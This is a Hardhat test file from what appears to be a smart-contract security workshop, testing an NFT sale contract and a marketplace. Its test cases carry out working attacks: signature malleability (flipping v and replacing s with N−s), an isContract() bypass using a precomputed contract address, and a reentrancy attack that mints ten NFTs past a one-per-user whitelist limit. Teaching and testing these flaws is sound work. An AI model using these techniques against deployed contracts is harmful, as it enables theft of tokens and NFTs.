const { expect } = require("chai");
const { ethers } = require("hardhat");
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree');
const fs = require('fs');
const { getContractAddress } = require('@ethersproject/address')
const { parseEther } = require("ethers/lib/utils");

function calculateMerkleRoot(whitelist) {
    const tree = StandardMerkleTree.of(whitelist, ["address", "uint256"]);
    const merkleRootUint8Array = tree.tree[0];
    const merkleRootHex = Buffer.from(merkleRootUint8Array).toString('hex');
    // return merkleRootHex; // 
    return merkleRootUint8Array;
}

function getMalleabilitySignature(sig) {
    let { r, s, v } = ethers.utils.splitSignature(sig);
    if (v == 27) v++;
    else if (v == 28) v--;
    const N = ethers.BigNumber.from("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
    const sBN = ethers.BigNumber.from(s);
    const malsigS = N.sub(sBN).toHexString();
    const malsig = ethers.utils.solidityPack(['bytes32', 'bytes32', 'uint8'], [r, malsigS, v]);
    // console.log("getMalleabilitySignature")
    // console.log("sig : ", sig, "\nr : ", r, "\ns : ", s, "\nv : ", v, "\nN : ", N, "\nsBN : ", sBN, "\nN - sBN : ", N.sub(sBN), "\nmalsigS : ", malsigS, "\nmalsig : ", malsig)
    return malsig;
}


async function deploy() {
    /// Get accounts
    let [deployer, seller, buyer, attacker, otherAccount] = await ethers.getSigners();

    // Get the chain ID from the Ethereum network provider
    const network = await ethers.provider.getNetwork();
    const chainId = network.chainId;

    const Whitelist = [
        [seller.address, 1],
        [buyer.address, 1],
        [attacker.address, 1],
        [otherAccount.address, 1]
    ];

    const merkleRoot = calculateMerkleRoot(Whitelist);
    const NFTprice = ethers.utils.parseEther("2");
    const whitelistPrice = ethers.utils.parseEther("1");
    const maxSupply = 100;
    const whitelistMaxPurchase = 1;

    /// Deploy testing contracts
    const USDT = await ethers.getContractFactory("USDT");
    const uSDT = await USDT.connect(deployer).deploy();

    const INXNFT = await ethers.getContractFactory("INXNFT");
    const iNXNFT = await INXNFT.connect(deployer).deploy(
        uSDT.address,
        NFTprice,
        whitelistPrice,
        maxSupply,
        whitelistMaxPurchase,
        merkleRoot);
    await iNXNFT.connect(deployer).startPublicSale();

    const Marketplace2 = await ethers.getContractFactory("Marketplace2");
    const marketplace2 = await Marketplace2.connect(deployer).deploy();

    const VulnerableERC721 = await ethers.getContractFactory("VulnerableERC721");
    const vulnerableERC721 = await VulnerableERC721.connect(deployer).deploy();

    const MaliciousReceiver = await ethers.getContractFactory("MaliciousReceiver");
    const maliciousReceiver = await MaliciousReceiver.connect(deployer).deploy(vulnerableERC721.address);

    // Define an example Offer struct
    const offer = {
        isSell: true,
        nftAddress: iNXNFT.address,
        tokenId: 1,
        tokenAddress: uSDT.address,
        price: ethers.utils.parseEther("4"),
        expiry: (await ethers.provider.getBlock("latest")).timestamp + 86400,
        nonce: 42,
    };

    // Mint USDT tokens for the buyer and seller
    await uSDT.connect(deployer).mint(buyer.address, ethers.utils.parseEther("10"));
    await uSDT.connect(deployer).mint(seller.address, ethers.utils.parseEther("10"));

    await uSDT.connect(seller).approve(iNXNFT.address, ethers.utils.parseEther("10"));
    await uSDT.connect(seller).approve(iNXNFT.address, ethers.utils.parseEther("10"));

    const ReentrancyINXNFT = await ethers.getContractFactory("ReentrancyINXNFT");
    const reentrancyINXNFT = await ReentrancyINXNFT.connect(seller).deploy(uSDT.address, iNXNFT.address);
    await uSDT.connect(seller).approve(reentrancyINXNFT.address, ethers.utils.parseEther("1000"));
    // const noContractAllowedNFTPurchase = 0;
    return { vulnerableERC721, maliciousReceiver, marketplace2, iNXNFT, uSDT, offer, deployer, seller, buyer, otherAccount, chainId, NFTprice, whitelistPrice, reentrancyINXNFT, Whitelist };
}

describe("Verify Signature", function () {
    it("should return the correct message hash with getMessageHashEncodePacked() function", async function () {
        const { marketplace2, iNXNFT, uSDT, offer, deployer, chainId } = await deploy();

        const expectedHash = ethers.utils.solidityKeccak256(
            ["bool", "address", "uint256", "address", "uint256", "uint256", "address", "uint256"],
            [
                offer.isSell,
                offer.nftAddress,
                offer.tokenId,
                offer.tokenAddress,
                offer.price,
                offer.expiry,
                marketplace2.address, // Use the contract's address
                chainId, // Get the chain ID
            ]
        );

        // Call the getMessageHash function
        const messageHash = await marketplace2.getMessageHashEncodePacked(offer);
        // Ensure that the expected and actual message hash values match
        expect(ethers.utils.hexlify(messageHash)).to.equal(ethers.utils.hexlify(expectedHash));
    });

    it("should return the correct message hash with getMessageHashEncode() function", async function () {
        const { marketplace2, iNXNFT, uSDT, offer, deployer, chainId } = await deploy();

        const abiEncoded = ethers.utils.defaultAbiCoder.encode(
            ["bool", "address", "uint256", "address", "uint256", "uint256", "address", "uint256"],
            [
                offer.isSell,
                offer.nftAddress,
                offer.tokenId,
                offer.tokenAddress,
                offer.price,
                offer.expiry,
                marketplace2.address, // Use the contract's address
                chainId // Get the chain ID
            ]
        );

        const expectedHash = ethers.utils.keccak256(abiEncoded);

        // Call the getMessageHash function
        const messageHash = await marketplace2.getMessageHashEncode(offer);
        // console.log(abiEncoded)
        // Ensure that the expected and actual message hash values match
        expect(ethers.utils.hexlify(messageHash)).to.equal(ethers.utils.hexlify(expectedHash));
    });

    it("Should let signature replay happen (SignatureMalleability)", async function () {
        const { marketplace2, offer, seller, chainId } = await deploy();

        const abiEncoded = ethers.utils.defaultAbiCoder.encode(
            ["bool", "address", "uint256", "address", "uint256", "uint256", "address", "uint256"],
            [
                offer.isSell,
                offer.nftAddress,
                offer.tokenId,
                offer.tokenAddress,
                offer.price,
                offer.expiry,
                marketplace2.address, // Use the contract's address
                chainId // Get the chain ID
            ]
        );

        const messageHash = ethers.utils.keccak256(abiEncoded);
        const getEthSignedMessageHash = await marketplace2.getEthSignedMessageHash(messageHash);
        const signature = await seller.signMessage(ethers.utils.arrayify(messageHash));
        const SignatureMalleability = await getMalleabilitySignature(signature);
        const recoverSigner = await marketplace2.recoverSigner(messageHash, SignatureMalleability);

        // console.log("1) getMessageHash:", messageHash);
        // console.log("2) getEthSignedMessageHash:", getEthSignedMessageHash);
        // console.log("3) Sign message hash (signature)", signature)
        // console.log("4) SignatureMalleability message hash (signature)", SignatureMalleability)
        // console.log("recoverSigner", recoverSigner)


        const result = await marketplace2.verify(seller.address, messageHash, SignatureMalleability);
        expect(result, 'Signature is not valid').to.be.true
    });

    it("Cross Purpose", async function () {
        const { marketplace2, iNXNFT, uSDT, offer, seller, deployer, chainId } = await deploy();

        const messageHash = ethers.utils.solidityKeccak256(
            ["bool", "address", "uint256", "address", "uint256", "uint256"],
            [
                offer.isSell,
                offer.nftAddress,
                offer.tokenId,
                offer.tokenAddress,
                offer.price,
                offer.expiry,
            ]
        );
        const signature = await seller.signMessage(ethers.utils.arrayify(messageHash));

        // console.log(signature)
    });

});


describe("acceptOffer", function () {
    it("should allow a buyer to accept an offer 1", async function () {
        const { marketplace2, iNXNFT, uSDT, offer, deployer, seller, buyer, chainId, NFTprice } = await deploy();
        // Mint an NFT token for the seller
        await iNXNFT.connect(deployer).mintReserve(1);
        await iNXNFT.connect(deployer).transferFrom(deployer.address, seller.address, 1);

        // Seller purchase an NFT
        await uSDT.connect(seller).approve(iNXNFT.address, NFTprice);
        await iNXNFT.connect(deployer).startPublicSale();
        await iNXNFT.connect(seller).purchaseNFT(1);
        await iNXNFT.connect(seller).approve(marketplace2.address, 2);

        // The seller approve NFT to the marketplace2
        await iNXNFT.connect(seller).approve(marketplace2.address, 1);

        // Mint USDT tokens for the buyer
        await uSDT.connect(deployer).mint(buyer.address, offer.price);
        // The buyer approve USDT token to the marketplace2
        await uSDT.connect(buyer).approve(marketplace2.address, offer.price);
        await uSDT.connect(seller).approve(marketplace2.address, offer.price);

        // Calculate the message hash that will be signed

        // Define an example Offer struct
        const abiEncoded = ethers.utils.defaultAbiCoder.encode(
            ["address", "uint256", "address", "uint256"],
            [
                offer.nftAddress,               // Address of the NFT contract (iNXNFT.address)
                offer.tokenId,                  // Token ID of the NFT (1)
                offer.tokenAddress,             // Address of the token used for payment (uSDT.address)
                offer.price,                    // Price of the NFT (ethers.utils.parseEther("4"))
            ]
        );
        const hash = ethers.utils.keccak256(abiEncoded);
        const sellerSignature = await seller.signMessage(ethers.utils.arrayify(hash));
        // console.log("sellerSignature : ", sellerSignature)
        // Call the acceptOffer function from the buyer's account
        // await marketplace2.connect(buyer).acceptOffer1(offer, sellerSignature);
        // await marketplace2.connect(seller).acceptOffer1(offer, sellerSignature);

        // // Check the state changes after the transaction
        // const sellerERC20Balance = await uSDT.balanceOf(seller.address);
        // const buyerERC721Owner = await iNXNFT.ownerOf(offer.tokenId);

        // // Assert the expected state changes
        // expect(sellerERC20Balance).to.equal(ethers.utils.parseEther("12"));
        // expect(buyerERC721Owner).to.equal(buyer.address);
    });


    // it("should allow a buyer to accept an offer", async function () {
    //     const { marketplace2, iNXNFT, uSDT, offer, deployer, seller, buyer, chainId, NFTprice } = await deploy();
    //     // Mint an NFT token for the seller
    //     await iNXNFT.connect(deployer).mintReserve(1);
    //     await iNXNFT.connect(deployer).transferFrom(deployer.address, seller.address, 1);

    //     // Seller purchase an NFT
    //     await uSDT.connect(seller).approve(iNXNFT.address, NFTprice);
    //     await iNXNFT.connect(deployer).startPublicSale();
    //     await iNXNFT.connect(seller).purchaseNFT(1);
    //     await iNXNFT.connect(seller).approve(marketplace2.address, 2);

    //     // The seller approve NFT to the marketplace2
    //     await iNXNFT.connect(seller).approve(marketplace2.address, 1);

    //     // Mint USDT tokens for the buyer
    //     await uSDT.connect(deployer).mint(buyer.address, offer.price);
    //     // The buyer approve USDT token to the marketplace2
    //     await uSDT.connect(buyer).approve(marketplace2.address, offer.price);

    //     // Calculate the message hash that will be signed


    //     const abiEncoded = ethers.utils.defaultAbiCoder.encode(
    //         ["bool", "address", "uint256", "address", "uint256", "uint256", "address", "uint256"],
    //         [
    //             offer.isSell,                   // Whether it's a sell or buy offer
    //             offer.nftAddress,               // Address of the NFT contract
    //             offer.tokenId,                  // Token ID of the NFT
    //             offer.tokenAddress,             // Address of the token used for payment
    //             offer.price,                    // Price of the NFT
    //             offer.expiry,                   // Expiry time of the offer
    //             marketplace2.address,           // Address of the marketplace contract
    //             chainId                         // Chain ID of the blockchain
    //         ]
    //     );

    //     const hash = ethers.utils.keccak256(abiEncoded);

    //     // const messageHash = await marketplace2.getMessageHashEncode(offer);
    //     // const messageHashEncodePack = await marketplace2.getMessageHashEncodePacked(offer);
    //     // console.log(hash)
    //     // console.log(messageHash)
    //     // console.log(messageHashEncodePack)
    //     // Sign the message hash with the seller's private key
    //     const sellerSignature = await seller.signMessage(ethers.utils.arrayify(hash));

    //     // Call the acceptOffer function from the buyer's account
    //     await marketplace2.connect(buyer).acceptOffer(offer, sellerSignature);

    //     // Check the state changes after the transaction
    //     const sellerERC20Balance = await uSDT.balanceOf(seller.address);
    //     const buyerERC721Owner = await iNXNFT.ownerOf(offer.tokenId);

    //     // Assert the expected state changes
    //     expect(sellerERC20Balance).to.equal(ethers.utils.parseEther("12"));
    //     expect(buyerERC721Owner).to.equal(buyer.address);
    // });

    it("should allow whitelisted user to purchase NFTs", async function () {
        const { iNXNFT, uSDT, deployer, seller, whitelistPrice, Whitelist } = await deploy();
        const tree = StandardMerkleTree.of(Whitelist, ["address", "uint256"]);
        const newData = JSON.stringify(tree.dump());
        const filePath = 'test/WorkShop/tree.json';
        fs.writeFileSync(filePath, newData);

        const treeProof = StandardMerkleTree.load(JSON.parse(fs.readFileSync(filePath, "utf8")));
        for (const [i, v] of treeProof.entries()) {
            if (v[0] === seller.address) {
                const proof = treeProof.getProof(i);
                // console.log('Value:', v);
                // console.log('Proof:', proof);
            }
        }

        await uSDT.connect(seller).approve(iNXNFT.address, whitelistPrice);
        await iNXNFT.connect(deployer).stopPublicSale();
        await iNXNFT.connect(seller).purchaseNFTWhitelist(
            1,
            [
                '0x457aa17fe0228467c8ff03c94ef937caf43d83d6102043300dc6a2e9a13a7006',
                '0x7740d3381dbcd10b48af3ea70e97436d50fcbf83c3e7cc4f341d5df1f404ebba'
            ]
        );
        // console.log("merkleRoot>>>", await iNXNFT.connect(seller).merkleRoot())
        expect(await iNXNFT.balanceOf(seller.address)).to.equal(1);

    });
});


describe("NoContractAllowed", function () {

    async function deployByPassingContract() {
        const { iNXNFT, uSDT, seller } = await deploy();
        const transactionCount = await seller.getTransactionCount()
        const futureAddress = getContractAddress({
            from: seller.address,
            nonce: transactionCount + 1
        })
        await uSDT.connect(seller).approve(futureAddress, ethers.utils.parseEther("100"));
        const BypassIsContract = await ethers.getContractFactory("BypassIsContract");
        const bypassIsContract = await BypassIsContract.connect(seller).deploy(uSDT.address, iNXNFT.address, { gasLimit: 500000 });
        return { bypassIsContract, seller, iNXNFT };
    }

    describe("Attack scenario", () => {
        it("Bypass isContract() to purchase NFT", async () => {
            const { bypassIsContract, seller, iNXNFT } = await deployByPassingContract()
            bypassIsContract.connect(seller).withdrawNFT(1);
            expect(await iNXNFT.balanceOf(seller.address)).to.equal(1);
        });
    });

});

describe("Reentrancy ", function () {
    it("Reentrancy ERC721", async () => {
        const { iNXNFT, uSDT, offer, deployer, seller, buyer, whitelistPrice, reentrancyINXNFT } = await deploy();
        const Whitelist2 = [
            [seller.address, 1],
            [buyer.address, 1],
            [reentrancyINXNFT.address, 1]
        ];

        const merkleRoot2 = calculateMerkleRoot(Whitelist2);
        await iNXNFT.connect(deployer).setMerkleRoot(merkleRoot2);

        const tree = StandardMerkleTree.of(Whitelist2, ["address", "uint256"]);
        const newData = JSON.stringify(tree.dump());
        const filePath = 'test/WorkShop/tree2.json';

        fs.writeFileSync(filePath, newData);

        const treeProof = StandardMerkleTree.load(JSON.parse(fs.readFileSync(filePath, "utf8")));

        for (const [i, v] of treeProof.entries()) {
            if (v[0] === seller.address) {
                const proof = treeProof.getProof(i);
                // console.log('Value:', v);
                // console.log('Proof:', proof);
            }
        }
        await uSDT.connect(seller).approve(iNXNFT.address, whitelistPrice);
        await uSDT.connect(buyer).approve(iNXNFT.address, whitelistPrice);
        await iNXNFT.connect(deployer).stopPublicSale();
        await reentrancyINXNFT.connect(seller).attack(
            1,
            ["0x3ef66d9922138427d5f0c22c88ff88e64263aa77d1fe0186c3b1a1ff7854fa9a"]
        );
        expect(await iNXNFT.balanceOf(reentrancyINXNFT.address)).to.equal(10);
    });
});